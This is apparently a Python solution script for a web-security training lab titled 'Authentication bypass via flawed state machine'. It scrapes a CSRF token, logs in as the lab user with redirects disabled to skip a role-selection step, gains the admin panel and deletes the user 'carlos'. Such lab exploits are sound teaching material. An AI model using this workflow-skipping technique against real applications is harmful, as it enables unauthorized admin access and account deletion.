# Problem -> Authentication bypass via flawed state machine

# Required module

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
from colorama import Fore,Back,Style,init
#init(autoreset=True)

#defining color pattern
green = Fore.GREEN
bright = Style.BRIGHT
reset = Style.RESET_ALL
print(bright,green)


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Defining proxies
proxy = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

#Exfiltrate csrf 
def get_csrf(s,url):
    res = s.get(url,verify=False,proxies=proxy)
    soup = BeautifulSoup(res.text,'html.parser')
    csrf = soup.find('input',{'name':'csrf'})['value']
    return csrf

# Carlos delete function
def delete_carlos(s,url):
    #login with no redirects
    login_url = url + '/login'
    csrf_token = get_csrf(s,login_url)
    login_data = {
        'csrf':csrf_token,
        'username':'wiener',
        'password':'peter'
    }
    s.post(login_url,data=login_data,verify=False,proxies=proxy,allow_redirects=False)
    res = s.get(url+'/',verify=False,proxies=proxy)
    if "Admin panel" in res.text:
        print('[+] Successfully Loggedin as Administrator')

        # deleting carlos
        url = url + '/admin/delete?username=carlos'
        res = s.get(url,verify=False,proxies=proxy)
        if 'Congratulations' in res.text:
            print('[+] Successfully delete carlos')
        else:
            print('[-] Unable to delete carlos')

    else:
        print('[-] Unable to log in')

# Main Function
def main():
    if len(sys.argv) != 2:
        print('[-] Usage: python3 {} <target-url>'.format(sys.argv[0]))
        sys.exit(-1)
    else:
        s = requests.session()
        url = sys.argv[1]
        delete_carlos(s,url)

if __name__ == '__main__':
    main()


print(reset)